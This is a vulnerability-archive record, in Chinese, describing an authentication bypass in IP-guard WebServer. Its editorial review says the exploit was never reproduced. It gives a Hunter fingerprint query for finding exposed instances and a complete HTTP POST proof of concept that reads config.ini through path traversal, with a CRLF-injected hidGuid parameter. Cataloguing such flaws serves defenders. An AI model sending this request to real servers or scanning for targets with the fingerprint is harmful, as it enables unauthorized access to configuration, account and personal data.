---
source: "wy876 漏洞文库"
id: "vw-0f246d2307f5611daacf5b46"
entity_id: "ve-0f246d2307f5611daacf5b46"
schema_version: "1"
title: "IP-guard WebServer 权限绕过漏洞"
product: "IP-guard WebServer"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
identifier_role: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
prerequisites: "无Cookie请求，hidGuid含CRLF，版本未知"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/IP-guard/IP-guardWebServer%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E.md"
review_date: "2026-10-02"
side_effects: "读取内容可能包含配置、账户或个人数据；应只保存授权环境中最小必要的响应，不能由接口可达推定敏感内容已泄露"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/dlylco77v8avu2od"
source_status: "recorded"
previous_fofa_unverified: "web.icon=="
hunter: "web.icon==\"210a3c89d4ab5effa18d6dd7a9627376\""
---

# IP-guard WebServer 权限绕过漏洞

> 指纹字段校订（2026-10-04）：本文原归档明确标为 Hunter 的完整表达式已记入 `hunter`；原残缺 `fofa_unverified` 值逐字保存在 `previous_fofa_unverified`。后文关于该字段残缺的旧说明只描述校订前状态。查询用于产品检索，不证明资产受影响。

<!-- article-review:devices:begin -->
## 技术校订与证据边界（2026-10-02）

- 产品/组件：IP-guard WebServer
- 本文讨论：downloadFile_client/getdatarecord路径读取
- 版本、权限与配置前提：无Cookie请求，hidGuid含CRLF，版本未知
- 资料类型：权限绕过文件请求；本次仅核对归档正文，未执行 PoC、未请求目标，未把原作者的“复现成功”继承为本库验证结果

### 逐项校订

- 介绍同时宣称任意删除，正文只有action=download未证删除
- 缺响应及hidGuid绕过解释；FOFA元数据误装残缺Hunter语法
- 已落实的文本修订：HTTP 报文围栏改为 http；残缺指纹退出可执行索引并保留原值。上列仍描述旧文问题时，以此落实项及下列限定为准；修订不代表运行验证

### 操作风险与恢复

- 读取内容可能包含配置、账户或个人数据；应只保存授权环境中最小必要的响应，不能由接口可达推定敏感内容已泄露

### 待核与来源

- 认证绕过机制、版本和删除分支待核
- 文内原始链接和图片引用继续保留；未检查图片像素、未下载或执行外部附件。版本边界、修复/在野状态及厂商归属若缺一手依据，均不能视为本次已确认
- 下方保留原技术正文与载荷；其中历史时间表述和成功主张应按本节限定阅读
<!-- article-review:devices:end -->


# 一、漏洞简介
IP-guard是由溢信科技股份有限公司开发的一款终端安全管理软件，旨在帮助企业保护终端设备安全、数据安全、管理网络使用和简化IT系统管理。由于IP-guard WebServer的权限验证机制中存在设计缺陷，远程攻击者能够规避安全验证，通过后端接口执行文件的任意读取和删除操作。

# 二、影响版本
+ IP-guard

# 三、资产测绘
+ hunter`web.icon=="210a3c89d4ab5effa18d6dd7a9627376"`
+ 特征


# 四、漏洞复现
```http
POST /ipg/appr/MApplyList/downloadFile_client/getdatarecord HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 64

path=..%2Fconfig.ini&filename=1&action=download&hidGuid=1v%0D%0A
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/dlylco77v8avu2od>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
